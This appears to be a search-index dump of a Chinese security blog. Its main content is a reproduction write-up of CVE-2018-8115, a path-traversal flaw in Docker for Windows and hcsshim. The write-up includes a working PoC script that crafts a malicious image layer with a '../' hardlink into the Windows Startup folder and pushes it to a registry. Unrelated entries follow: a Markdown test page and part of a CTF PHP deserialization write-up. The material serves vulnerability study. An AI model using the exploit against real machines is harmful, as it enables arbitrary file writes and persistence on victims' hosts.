[{"categories":["有趣的渗透测试"],"content":"Docker for Windows","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"前言 微软与 Docker 合作，让 Docker 能够跑在 Windows 上以及支持 Windows 容器，做了很多工作，其中一个是开发了 hcsshim 套件，该套件可使用Windows Host Compute Service（HCS）启动和管理 Windows 容器。它还包含用于管理 Windows 容器的其他帮助程序和功能，例如用于主机网络服务（HNS）的 Golang 界面。 在 hcsshim v0.6.10 之前的版本中，该套件由于将未经处理的输入与将 Golang 的 filepath.Join 结合使用，导致攻击者可利用 ../ 这样的控制序列字符串来达到控制目录的效果，从而实现在宿主机系统中创建、删除和替换文件，甚至可以写入恶意脚本到自启项目录，来达到命令执行的效果。而使用了此套件的 Docker for Windows 受到此漏洞影响，如果攻击者恶意构造了镜像，受害者 pull 镜像即可造成攻击。 ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:1:0","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"环境搭建 由于该漏洞出现在 Docker for Windows 上，并且需要自己构建镜像，所以需要使用到以下环境： Windows 10 2004：版本无强制要求，Win10 就行，文章中使用的系统内部版本号为 19041.450 Ubuntu 20.04 LTS：版本无强制要求，用来搭建私有仓库 Registry Docker for Windows 17.12.0-ce-win47：https://docs.docker.com/docker-for-windows/release-notes/#docker-community-edition-17120-ce-win47-2018-01-12 VMware® Workstation 15 Pro ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:2:0","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"Docker for Windows 安装 首先，在虚拟机上装好 Windows 10 2004，开机前调整如下配置： 内存设置 4G 以上 开启虚拟化引擎 \" 设置好之后，即可开机，并安装 Docker for Windows Installer.exe，安装比较简单，按照如下步骤即可： \" 安装完毕之后会注销一次，再次登录之后，Docker 会自动启动，并且会要求开启 Hyper-V： \" 单击 OK 之后，会自动重启，并安装 Hyper-V，重启之后，会看下如下提示： \" 单击 Start，随后等待 Docker 启动，等待良久之后会出现下面这个错误提示： \" 出现这个提示是因为是在虚拟机上安装的 Docker for Windows，如果是真实机器就不会出现这个情况。解决方法是右键右下角的 Docker 图标，单击 Switch to Windows containers，如下： \" 切换了之后 Docker 会正常启动成功，在命令行输入 docker info 可看到 Docker 相关信息： \" ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:2:1","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"Registry 搭建 首先需将 Ubuntu 20.04 系统安装好，装好之后在命令行输入 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 安装 Docker，注意需要 root 权限： \" 设置 Docker 镜像加速，这样下载镜像时快一点，输入命令 echo '{\"registry-mirrors\":[\"https://hub-mirror.c.163.com/\"]}' \u003e /etc/docker/daemon.json (如文件已存在请根据实际情况添加)： \" 输入以下语句重启 Docker： systemctl daemon-reload systemctl restart docker 使用 docker info 可查看是否设置成功： \" Docker 安装好之后，接下来搭建 Registry，输入如下命令： docker run -d -p 5000:5000 --name registry docker.io/library/registry:2 \" 容器运行起来之后使用 curl http://127.0.0.1:5000/v2/_catalog 可测试是否搭建成功： \" ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:2:2","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"复现漏洞 该漏洞主要针对 Docker 在 pull 镜像时，未处理好镜像中的文件拷贝，导致可以穿越路径来写入恶意文件到指定路径。所以第一件事是先构建恶意镜像，需在刚才搭建的 Registry 上构建。 由于作者提供的 PoC 存在一定的问题，直接使用会失败，这里将其进行了修改： #!/bin/bash # # Copyright (C) 2018, Michael Hanselmann \u003chttps://hansmi.ch/\u003e # set -e -u -o pipefail set -x registry=http://localhost:5000 tmpdir=$(mktemp -d) trap 'rm -rf \"$tmpdir\"' EXIT tmplayer=\"${tmpdir}/layer.tar\" digest() { echo -n sha256: \u0026\u0026 \\ sha256sum | cut -c-64 } upload() { local datafile=\"$1\" local digest=\"$(digest \u003c \"$datafile\")\" # Prepare upload local upload_location=$( curl -v --dump-header - -XPOST \"${registry}/v2/evil/image/blobs/uploads/\" | perl -ne 'chomp \u0026\u0026 /^Location:\\s*(.+?)\\s*$/ \u0026\u0026 print $1' ) echo \"upload_location=${upload_location}\" \u003e\u00262 curl -v -XPUT --header 'Expect:' --data-binary \"@${datafile}\" \\ --header 'Content-Type: application/octet-stream' \\ \"${upload_location}\u0026digest=${digest}\" echo -n \"$digest\" } write_base_layer() { # Tar containing hive files and dummy Dockerfile base64 -d \u003c\u003c'EOF' | gunzip -c H4sIANXIjFoAA+3d3W7bdBjHcbdaQYoYTGy89MyHcNL43elBQU6bqhUr6QtjVEJDJnOyqC9Bjrt2 HO0SuAkkBBfADXDCMTfAEadcQrFju9ip2yWd46zx9yM1cfz4n3hOn7/n6Kdm2z7bcOynjttfkqrr 3UOnL+ROCl11LymaKsiqf6uokiTrgiQrmqkL4ln+u3LZSd+zXX9XXvd5hv9xt4RWEx9u1q3d1Y3N rxtLLdexvW7v2OseOSuyLi8rkqLK5pKumrWa4b87FUUXt/Yeb3651ny8t9T2f19sz3NXZKOiSqJ9 9TC/2rq2enR1ddqHaKZNqOVTJEm7tv+D5XT/S4qkCqI+4f0aKHn/D97/6nbyLLDWax04btDbOb3G q+Z/XVUS77/sv/+arsnM/0VQR5j/1StmfVWpKLKaqLj2af/pirVjNTr1Hct3YMXWBrd1qxM+rO8N 7jqDxzuNaKNH0dq6v3Yn2rBjVU8bbctqrEYbrW8Gt6tW+Nh/nahej+uN6DXWrdWqtbuVfP6H0cK+ 9cWBv5OX9udZ8LiiXDqVqdknMMOUzWU5OCteOoGpt+S0FfZ/7i2f4s/n18//ujHU/4qi+/1fSBOV vP/Xd5tb4lG35fb6vbZXPbaPe33Hfe64dyt3K6vN7X3x/98NsTrtvUXeUmf+je7zN+T6T5c5/xeC 679ym1DLp9zk+k82uf4rwuD9H7r+c9r2yaH3yP9/wHdrzqFnv+5rjD//G5LG53+FGHH+12TTqBlX zv/+lWDm/H8xLHP+T1Yvz/8X1WkfopkW9n/uLZ9y/fWfkjH/q3rQ/1z/TZ7rdNpz/v1cYl2w/FZi WQwW7qW3mZT5V9Sb7d1OEftRBov39bmff/vwyb+//sUhBQAAAIAZ9+z77vFg4V52/Zfz8/PjA1H4 84+3L64T/VXncf08Ei+fDdWT7vg/u83mV8HyN/42/QNBCLYPfoIn/mlwf+flD/79y2jMAyH4TODb wVhh/oHwufCeMBderS68P1j3cbgu/OBgQfRvxPlw20V/ZLRteJtet/BOUBgaN/z473evPXwAAAAA ANwKGfmvPfso3xDI+PkvTdUU8l9FGDX/pZh6TRk//xUPy85/JaoZ+a+4Ou1DNNPC/s+95VPGz38p UtD/5L8mj/xXeQX5r/nfPyL/BQAAAAAlQP4rPY78FwAAAABgFmXlv5zWidv1XuSWCBk//6VrKn// sRCj5r9UU5PM8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4+1+yyt9/LgT5r/IK8l//7C+S/wIA AACAEiD/lR5H/gsAAAAAMIuy8l+9tndqu85U81+yRv6rCKN+/69RW9aWx85/XQzL/v7fRDXj+3/j 6rQP0UyL8l95t3zKTfJfQf+T/5o88l/lFeS/Pv3sPvkvAAAAACgB8l/pceS/AAAAAACzKCv/9aLv OXl+H9wN8l+yZJD/KsKo+S+zVjPU8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4/kcj6H/yX5NH /qu8gvzXJz9+QP4LAAAAAEqA/Fd6HPkvAAAAAAAAAAAAAAAAAAAAAG+q/wA9MZkjAPAAAA== EOF } write_layer() { write_base_layer \u003e \"${tmpdir}/demo.tar\" python3 -c ' import sys import time import tarfile import tempfile import struct startupfile = \\ \"ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/evil.bat\" with tempfile.NamedTemporaryFile() as script, \\ tarfile.open(sys.argv[1], \"w\", format=tarfile.PAX_FORMAT) as tar: # Generate new digest every time script.write(\"echo Hello World {}\\r\\npause\\r\\n\".format(time.time()).encode(\"ascii\")) script.flush() tar.add(script.name, arcname=\"Files/script.bat\") # Hardlink for startup script info = tarfile.TarInfo(\"Files\\\\../../../../../../../../\" + startupfile) info.type = tarfile.LNKTYPE info.linkname = \"Files\\\\script.bat\" tar.addfile(info) ' \"${tmpdir}/evil.tar\" cat \u003c \"${tmpdir}/demo.tar\" \u003e \"$tmplayer\" tar --concatenate --absolute-names -f \"$tmplayer\" \"${tmpdir}/evil.tar\" tar -Ptvf \"$tmplayer\" } write_layer layer_digest=$(upload \"$tmplayer\") layer_size=$(stat --format='%s' \"$tmplayer\") cat \u003e\"${tmpdir}/config.json\" \u003c\u003cEOF { \"architecture\": \"amd64\", \"name\": \"image\", \"tag\": \"10\", \"config\": { \"Hostname\": \"\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": null, \"Cmd\": [ \"noop\" ], \"Image\": \"sha256:8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12\", \"Volumes\": null, \"WorkingDir\": \"\", \"Entrypoint\": null, \"On","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:3:0","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"踩坑日记 在最开始，直接使用作者的 PoC 时，会直接报错，最后一步上传镜像到 Registry 时会直接提示 500，如下： \" 因为对 Docker 不是很熟悉，所以这个问题不知道怎么去解决，通过不断的搜寻资料，深入学习了 Docker 的一点知识，才将该问题解决，这里记录下解决的过程。 ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:4:0","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"Docker学习 众所周知，Docker 是通过镜像来创建容器的。而一个镜像的构成，是由层（layer）的形式构成的。在每一层中，存储的都是当前层与上一层之间的文件变化，在容器构建的时候，Docker 会将每一层依次的组合在一起形成文件系统，最后在顶层加上容器层以便修改。在镜像中，每多一层镜像的体积就会大一些，这也是为什么 Dockerfile 推荐尽可能的减少行数，因为每多添加一行，镜像中的层就多一层，最后导致镜像体积变得很大。 上面大概介绍了镜像的构造，接下来详细介绍下镜像的文件存储结构，这里使用 Windows 容器 NanoServer 来做演示，首先在命令行中输入命令 docker pull mcr.microsoft.com/windows/nanoserver:10.0.14393.2068 下载 NanoServer 镜像，如下： \" 接下来，将镜像导出为 tar 格式的文件，在 PowerShell 中输入如下命令： cd ~ mkdir test cd test docker save -o nanoserver.tar mcr.microsoft.com/windows/nanoserver:10.0.14393.2068 \" 导出之后将其解压，可看到其中有如下文件和目录： \" 一个完整的镜像的 tar 包格式一般如下： manifest.json：整个镜像的清单信息，包含着镜像每一层数据所处的文件位置，并且该文件的 SHA256 还与镜像的摘要有关 镜像id.json：镜像的配置信息，包含镜像的的各个信息，最重要的是包含镜像修改的历史记录以及每一层数据的摘要 repositories：一般保存的是镜像的 tag 与 id 的对应关系 每一层的目录： json：该层的信息 layer.tar：该层未压缩的 tar 包，存储与上一层的文件变化 VERSION：该层的版本，一般为 1.0 首先来看 manifest.json，该文件是整个镜像的清单文件，保存的镜像中每一层的数据的所在位置，如下： [ { \"Config\": \"8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json\", \"RepoTags\": [ \"mcr.microsoft.com/windows/nanoserver:10.0.14393.2068\" ], \"Layers\": [ \"ad4ea25c1eec6037158aa418802620adec29cc64c56569c38ca5211ab74f93da\\\\layer.tar\", \"3128d665ad88b5e4d2111974265579b4b0fc70bfe10da79c27fc984f31098431\\\\layer.tar\" ], \"LayerSources\": { \"sha256:06def82ae218583423386cf68ab2dbb0715e69132d9b74e2fbdd9173142ef6f7\": { \"mediaType\": \"application/vnd.docker.image.rootfs.foreign.diff.tar.gzip\", \"size\": 152802641, \"digest\": \"sha256:cb1aafb7147372cc64faa070b94a893b8cd2e3de3a0e8001dc225c627d991c58\", \"urls\": [ \"https://go.microsoft.com/fwlink/?linkid=867858\" ] }, \"sha256:6c357baed9f5177e8c8fd1fa35b39266f329535ec8801385134790eb08d8787d\": { \"mediaType\": \"application/vnd.docker.image.rootfs.foreign.diff.tar.gzip\", \"size\": 252691002, \"digest\": \"sha256:bce2fbc256ea437a87dadac2f69aabd25bed4f56255549090056c1131fad0277\", \"urls\": [ \"https://go.microsoft.com/fwlink/?linkid=837858\" ] } } } ] 在该文件中，以下字段是相对重要的： Config：指定镜像的配置文件，可以看到镜像解压目录下有同名的 8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json 文件 RepoTags：镜像的 name 与 tag，在这里 name 为 mcr.microsoft.com/windows/nanoserver，tag 为 10.0.14393.2068 Layers：一个保存每层的 layer.tar 文件路径的列表，顺序由底层到顶层，可以看到这里的两个值分别对应解压目录中的文件 \" 再来看 8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json，该文件为镜像的配置信息，包含了镜像的大部分信息，其中最重要的字段是 history 与 rootfs，如下（为节省篇幅这里省略了部分信息）： { // ... \"history\": [ { \"created\": \"2016-12-13T10:47:17Z\", \"created_by\": \"Apply image 10.0.14393.0\" }, { \"created\": \"2018-02-13T19:43:23Z\", \"created_by\": \"Install update 10.0.14393.2068\" } ], \"rootfs\": { \"type\": \"layers\", \"diff_ids\": [ \"sha256:6c357baed9f5177e8c8fd1fa35b39266f329535ec8801385134790eb08d8787d\", \"sha256:06def82ae218583423386cf68ab2dbb0715e69132d9b74e2fbdd9173142ef6f7\" ] } } 可以看到 history 记录的是镜像修改的信息，而 rootfs 的 diff_ids 记录的是每一层的 Digest。在这个演示中 history 并不重要，这里着重讲一下 rootfs。 rootfs 存储的是每一层的 Digest，也就是每一层的 layer.tar 的 SHA256，格式为 sha256:SHA256(layer.tar)，顺序由底层到顶层。这里我们实践一下，在 PowerShell 中使用 Get-FileHash -Algorithm SHA256 文件名 计算文件的 SHA256，计算结果如下： \" 再来看该文件本身，该文件的 SHA256，不仅为它自身的文件名，还为该镜像的 IMAGE ID，如下： \" 最后再来看每一层目录中的内容，每层的目录名的计算方式没有找到，这个不重要，只要能在 manifest.json 文件中写对就行了。其次是目录中的内容，VERSION 是版本信息，这个不用管，layer.tar 是重要的层次文件变化信息，该文件的 SHA256 需要写入到镜像配置文件中，tar 包里的文件内容全是上一层到这一层之间的文件变化信息，也可以先不用管。最主要的是 .json 这个文件，该文件中记录了该层的一些信息，其中最重要的字段是 id 与 parent。id 其实就是当前目录的名称，parent 为父层目录的名称，如果没有父层则没有这个字段，这里的演示结果如下： \" 总结下镜像的存储要点： 镜像存储的格式一般为 manifest.json、镜像id.json、各层的目录，而各层的目录下存在 layer.tar、json、VERSION 镜像id.json 保存着镜像的大部分信息，其中 rootfs 记载着每一层的 Digest，顺序由底层到顶层。该文件本身的 SHA256 信息为它自己的文件名、镜像 id manifest.json 指定镜像的配置文件名称，还包含着每一层文件的具体位置 每一层目录下的 layer.tar 为主要的层次文件变化信息，json 文件记载着该层的信息，其中包括指向父层的目录 parent 字段 ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:4:1","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"问题分析 大概了解了镜像的存储格式之后，现在来分析下问题。在漏洞作者给出的脚本中，做的事大概有如下几件： 生成 demo.tar 与 evil.tar，demo.tar 为 Dockerfile 生成的layer信息，evil.tar 为恶意文件，然后将两者合并为 layer.tar 上传 layer.tar 到私有仓库，这个文件相当于镜像中的 layer 了 上传 config.json 到私有仓库，这个文件相当于镜像中的 镜像id.json 上传 manifest.json 到私有仓库，这个文件相当于镜像中的 manifest.json 前面三步都是很正常的运行完了，最后上传 manifest.json 时出错了，报错信息如下： { \"errors\": [ { \"code\": \"UNKNOWN\", \"message\": \"unknown error\" }, { \"code\": \"UNKNOWN\", \"message\": \"unknown error\", \"detail\": {} }, { \"code\": \"MANIFEST_BLOB_UNKNOWN\", \"message\": \"blob unknown to registry\", \"detail\": \"sha256:bce2fbc256ea437a87dadac2f69aabd25bed4f56255549090056c1131fad0277\" }, { \"code\": \"UNKNOWN\", \"message\": \"unknown error\" }, { \"code\": \"UNKNOWN\", \"message\": \"unknown error\", \"detail\": {} }, { \"code\": \"MANIFEST_BLOB_UNKNOWN\", \"message\": \"blob unknown to registry\", \"detail\": \"sha256:cb1aafb7147372cc64faa070b94a893b8cd2e3de3a0e8001dc225c627d991c58\" } ] } 其中有 MANIFEST_BLOB_UNKNOWN 错误，根据官方资料，得知该错误是找不到 blob，也就是找不到对应的 layer 信息，导致私有仓库根据 config.json 和 manifest.json 构建镜像时失败了。 大概知道原因之后，但无法继续了。首先无法确定到底是不是上面分析的错误原因，因为从上面的报错信息来看，有很多个错误信息，找不到 blob 只是其中的一个。其次如果真的是找不到 blob 的缘故，那应该把 manifest.json 信息中的两个 blob 传上去就行了，但是这两个 blob 太大了，需要用官方的分块传输 API，使用起来太费劲了。 因为上述原因，在这里卡了很久，在这期间学习了上面的 Docker 镜像存储的知识。学得差不多的时候，回过头一想，是不是可以不用这种方式实现漏洞攻击呢？于是详细猜测了下漏洞原理，作者复现漏洞使用的是 docker pull，pull 之后即可看到恶意文件被写入了系统，这里思考一下为什么能达到这个效果，推测在使用 docker pull 命令时会将镜像存储在本地（经过后面的学习验证的确是这样），然后存储的时候未处理好导致了漏洞的产生。猜到这里之后，再想到 docker load 也可以导入镜像，那是不是用 docker load 也能实现这个漏洞效果呢？说干就干，docker load 需要一个 tar 的镜像，那就可以构造一个恶意镜像，然后 docker load 这个镜像，来验证猜想。 这个镜像该如何构造呢，其实可以参照漏洞作者的做法。从漏洞作者的脚本上来看，其实他也是使用的是 NanoServer 镜像，然后再原有的两个 layer 上多添加了一层，就是他自己构造的恶意文件那一层，所以我这里也是模拟的他的做法，再原有基础上再添加一层，把恶意文件添加成新的一层，然后更改相应的配置信息即可。 首先将漏洞作者脚本里生成的恶意文件 tar 包给导出来，脚本如下： #!/bin/bash write_base_layer() { # Tar containing hive files and dummy Dockerfile base64 -d \u003c\u003c'EOF' | gunzip -c H4sIANXIjFoAA+3d3W7bdBjHcbdaQYoYTGy89MyHcNL43elBQU6bqhUr6QtjVEJDJnOyqC9Bjrt2 HO0SuAkkBBfADXDCMTfAEadcQrFju9ip2yWd46zx9yM1cfz4n3hOn7/n6Kdm2z7bcOynjttfkqrr 3UOnL+ROCl11LymaKsiqf6uokiTrgiQrmqkL4ln+u3LZSd+zXX9XXvd5hv9xt4RWEx9u1q3d1Y3N rxtLLdexvW7v2OseOSuyLi8rkqLK5pKumrWa4b87FUUXt/Yeb3651ny8t9T2f19sz3NXZKOiSqJ9 9TC/2rq2enR1ddqHaKZNqOVTJEm7tv+D5XT/S4qkCqI+4f0aKHn/D97/6nbyLLDWax04btDbOb3G q+Z/XVUS77/sv/+arsnM/0VQR5j/1StmfVWpKLKaqLj2af/pirVjNTr1Hct3YMXWBrd1qxM+rO8N 7jqDxzuNaKNH0dq6v3Yn2rBjVU8bbctqrEYbrW8Gt6tW+Nh/nahej+uN6DXWrdWqtbuVfP6H0cK+ 9cWBv5OX9udZ8LiiXDqVqdknMMOUzWU5OCteOoGpt+S0FfZ/7i2f4s/n18//ujHU/4qi+/1fSBOV vP/Xd5tb4lG35fb6vbZXPbaPe33Hfe64dyt3K6vN7X3x/98NsTrtvUXeUmf+je7zN+T6T5c5/xeC 679ym1DLp9zk+k82uf4rwuD9H7r+c9r2yaH3yP9/wHdrzqFnv+5rjD//G5LG53+FGHH+12TTqBlX zv/+lWDm/H8xLHP+T1Yvz/8X1WkfopkW9n/uLZ9y/fWfkjH/q3rQ/1z/TZ7rdNpz/v1cYl2w/FZi WQwW7qW3mZT5V9Sb7d1OEftRBov39bmff/vwyb+//sUhBQAAAIAZ9+z77vFg4V52/Zfz8/PjA1H4 84+3L64T/VXncf08Ei+fDdWT7vg/u83mV8HyN/42/QNBCLYPfoIn/mlwf+flD/79y2jMAyH4TODb wVhh/oHwufCeMBderS68P1j3cbgu/OBgQfRvxPlw20V/ZLRteJtet/BOUBgaN/z473evPXwAAAAA ANwKGfmvPfso3xDI+PkvTdUU8l9FGDX/pZh6TRk//xUPy85/JaoZ+a+4Ou1DNNPC/s+95VPGz38p UtD/5L8mj/xXeQX5r/nfPyL/BQAAAAAlQP4rPY78FwAAAABgFmXlv5zWidv1XuSWCBk//6VrKn// sRCj5r9UU5PM8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4+1+yyt9/LgT5r/IK8l//7C+S/wIA AACAEiD/lR5H/gsAAAAAMIuy8l+9tndqu85U81+yRv6rCKN+/69RW9aWx85/XQzL/v7fRDXj+3/j 6rQP0UyL8l95t3zKTfJfQf+T/5o88l/lFeS/Pv3sPvkvAAAAACgB8l/pceS/AAAAAACzKCv/9aLv OXl+H9wN8l+yZJD/KsKo+S+zVjPU8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4/kcj6H/yX5NH /qu8gvzXJz9+QP4LAAAAAEqA/Fd6HPkvAAAAAAAAAAAAAAAAAAAAAG+q/wA9MZkjAPAAAA== EOF } write_layer() { write_base_layer \u003e ./demo.tar python3 -c ' import sys import time import tarfile import tempfile import struct startupfile = \\ \"ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/evil.bat\" with tempfile.NamedTemporaryFile() as script, \\ tarfile.open(sys.argv[1], \"w\", format=tarfile.PAX_FORMAT) as tar: # Generate new digest every time script.write(\"echo Hello World {}\\r\\npause\\r\\n\".format(time.time()).encode(\"ascii\")) script.flush() tar.add(script.name, arcname=\"Files/script.bat\") # Hardlink for startup script info = tarf","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:4:2","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"最终解决 通过上面的操作，本地 load 方式是可以触发漏洞的，现在再回过头来看看 pull 时的漏洞触发。这一步失败的原因上面也讲到了，无非就是 Registry 无法识别我们传上去的 config.json 与 manifest.json，解决这个问题还是得多看看官方文档，我在这里花了很多时间，结合网上的资料，某一天突然想到，既然提示另两个 blob 找不到，那我配置文件中不写它们不就完了，config.json 与 manifest.json 里面的 blob 就只写自己构造的恶意文件那一层就行了，于是修改后的配置文件变成了这样： \" 可以看到其实就是 config.json 与 manifest.json 中多余的镜像层被删掉了，删了之后按照复现漏洞的步骤走，就成功使用 pull 实现了漏洞攻击。 ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:4:3","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"END 其实大概的漏洞原理经过复现与网上的资料学习，了解得差不多了。大概就是 Docker 将镜像存储在本地时，需要将 layer 内的文件根据它的路径解压到本地，但由于对路径处理的有问题，直接使用包含 ../ 的路径解压了文件，导致攻击者可以控制文件创建的路径，从而实现任意文件写入。需要注意的是，这并不是 Docker 的问题，而是微软提供的 API 接口有问题，所以该漏洞也只存在与 Docker for Windows 上。 按照分析流程，现在应该分析一波代码，弄清楚具体出现问题的漏洞点，但无奈对 Go 语言的不太熟，这种大项目的源码又很复杂，所以现在的水平还无法对其进行源码分析，这里总结了下面几个链接，可以参考参考： Docker 未修复漏洞的版本：\u003c= v18.03.1-ce-rc1 Docker 漏洞版本的相邻 tag：https://github.com/moby/moby/tags?after=v18.06.0-ce-rc1 微软开始修复漏洞的 commit：https://github.com/microsoft/hcsshim/commit/79062a5b985d24ef42a4252a1b63a93ec450e407?branch=79062a5b985d24ef42a4252a1b63a93ec450e407\u0026diff=split# hcsshim v0.6.8~v0.6.10 之间的差异：https://github.com/microsoft/hcsshim/compare/v0.6.8...v0.6.10 镜像存储源码分析：https://www.infoq.cn/article/docker-source-code-analysis-part11 ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:5:0","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["有趣的渗透测试"],"content":"参考链接 参考链接 漏洞发现者官方 Poc：https://hansmi.ch/articles/2018-04-windows-hcsshim-security#poc Docker 官方命令说明： https://docs.docker.com/engine/reference/commandline/save/ https://docs.docker.com/engine/reference/commandline/load/ Docker Registry 官方文档： https://docs.docker.com/registry/spec/api/ https://docs.docker.com/registry/spec/manifest-v2-2/ Docker 搭建 registry： https://uzshare.com/view/793256 https://yeasy.gitbook.io/docker_practice/repository/registry Docker 的 Pull Digest 和 Image ID：https://developer.aliyun.com/article/57752 Docker 镜像存储详细分析：https://www.cnblogs.com/sparkdev/p/9121188.html Docker 镜像格式规范：https://ying-zhang.github.io/yi/2017/x-docker-image-spec-v1.2/ ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:6:0","tags":["漏洞复现"],"title":"CVE-2018-8115 漏洞复现","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["杂七杂八"],"content":"最近由于想换一个笔记软件，需测试笔记软件的 Markdown 语法是否完备，所以列举了大部分自己常用的 Markdown 语法，以便复制进行测试，如下： # 目录索引测试 [toc] --- # 标题测试 # 这是 H1 标题 ## 这是 H2 标题 ### 这是 H3 标题 #### 这是 H4 标题 ##### 这是 H5 标题 ###### 这是 H6 标题 --- # 引用块测试 \u003e 这是第一行引用块 \u003e 这是第二行引用块 \u003e \u003e 这是跨行引用块 \u003e --- # 列表测试 * 无序列表 1 * 无序列表 2 * 无序列表 3 1. 有序列表 1 2. 有序列表 2 3. 有序列表 3 --- # 任务列表测试 - [ ] 未完成的列表 1 - [ ] 未完成的列表 2 - [x] 已完成的列表 1 - [ ] 未完成的列表 3 --- # 代码块测试 行内代码：`\u003ch1\u003eHello, World!\u003c/h1\u003e` 代码块：主要查看高亮 HTML ```html \u003ch1\u003eHello, World!\u003c/h1\u003e ``` Python ```python print(\"Hello, World!\") ``` Java ```java System.out.println(\"Hello, World!\"); ``` C ```c printf(\"Hello, World!\"); ``` C++ ```c++ std::cout \u003c\u003c \"Hello, World!\"; ``` JavaScript ```javascript \u003cscript\u003econsole.log(\"Hello, World!\")\u003c/script\u003e ``` Go ```go fmt.Println(\"Hello, World!\") ``` Shell ```shell echo \"Hello, World!\" ``` --- # 表格测试 | 第一个表头 | 第二个表头 | | ------------- | ------------- | | 第一行第一列 | 第一行第二列 | | 第二行第一列 | 第二行第二列 | --- # 水平线测试 --- --- # 链接测试 这个 [链接](# \"我是链接提示\") 有提示。 这个 [链接](#) 没有提示。 --- # 图片测试 这个图片没有提示。 ![](https://www.baidu.com/favicon.ico) 这个图片有提示。 ![我是下方提示](https://www.baidu.com/favicon.ico \"我是鼠标放置提示\") --- # 字体测试 我是普通字体 **我是粗体** *我是斜体* ~~我是删除线~~ --- # Emoji 测试 我是笑脸😄 --- # HTML 测试 \u003cspan style=\"color:red\"\u003e这是红色的 HTML 文本\u003c/span\u003e ","date":"2020-09-06","objectID":"/2020/09/note-software-test/:0:0","tags":[],"title":"笔记软件测试","uri":"/2020/09/note-software-test/"},{"categories":["CTF"],"content":"强网杯2020","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/","tags":["强网杯"],"title":"强网杯2020部分WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"MISC——签到 打开题目即可看到flag \" ","date":"2020-08-24","objectID":"/2020/08/qwb-2020-writeup/:1:0","tags":["强网杯"],"title":"强网杯2020部分WriteUp","uri":"/2020/08/qwb-2020-writeup/"},{"categories":["CTF"],"content":"强网先锋——web辅助 打开题目，下载附件源码，共有 4 个文件，其中 index.php 与 play.php，是序列化与反序列化的执行文件，class.php 是类文件，common.php 是工具文件。 在index.php中，接收两个参数并生成对象，最后将对象信息经过处理后存进文件中： \" 在play.php中，读取文件内容，并经过检查和处理后，反序列化成对象： \" 在class.php中，存在几个类的定义，具体分析如下： jungle类：读取flag的类 KS()：执行系统命令读取了flag __toString()：调用了 KS()。因为 __toString() 的特性，当该类的对象被当字符串进行处理时，都会调用 __toString() ，例如echo new jungle()，当然除了echo，还有其他方法也能触发调用 __toString()，如strlen()、strstr()等等 jungle 类是一个关键类，关乎到是否能读取flag，在这个类中，想要调用 KS() 读取flag，就得利用 __toString() 的特性，让 jungle类对象 被当作字符串处理，即可读取flag midsolo类：触发 jungle类__toString() 的类 Gank()：将 $this-\u003ename 进行了 stristr() 判断 __invoke()：调用了 Gank() __wakeup()：给 $this-\u003ename 赋值为字符串 在 midsolo 类中，关键的地方在于 Gank() 方法中的 stristr() 判断。根据上面 jungle 类的分析，如果这里 $this-\u003ename 为 jungle类对象 时，那么就会 调用jungle类的__toString()，从而调用 KS() 读取到flag 而在 __invoke() 方法，调用了 Gank()，也就是说，当 midsolo的类对象被当成方法调用 时，即可调用 Gank()，如下： 